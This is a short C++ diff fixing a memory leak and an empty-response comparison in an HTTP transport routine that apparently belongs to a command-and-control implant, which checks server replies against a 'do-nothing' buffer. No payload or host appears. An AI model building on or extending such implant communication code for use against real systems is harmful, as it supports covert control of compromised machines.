@@ -17,6 +17,7 @@ using namespace Root;
             NewPtr = (PVOID*)hReAlloc(Ctx->ObjectFree.Ptr, sizeof(PVOID) * (Ctx->ObjectFree.Length + 1)); \
         } \
         if (!NewPtr) { \
+            hFree(Data); \
             break; \
         } \
         Ctx->ObjectFree.Ptr = NewPtr; \
@@ -1336,8 +1337,8 @@ auto DECLFN Transport::HttpSend(
         return CleanupHttpContext( &Ctx );
     }
 
-    if ( RespData.Ptr && RespData.Size > 0 && RespData.Size == Method.DoNothingBuff.Size ) {
-        if ( Mem::Cmp( RespData.Ptr, Method.DoNothingBuff.Ptr, Method.DoNothingBuff.Size ) ) {
+    if ( RespData.Ptr && RespData.Size == Method.DoNothingBuff.Size ) {
+        if ( RespData.Size == 0 || Mem::Cmp( RespData.Ptr, Method.DoNothingBuff.Ptr, Method.DoNothingBuff.Size ) ) {
             KhDbg("Response matches do-nothing buffer");
             
             hFree( RespData.Ptr );
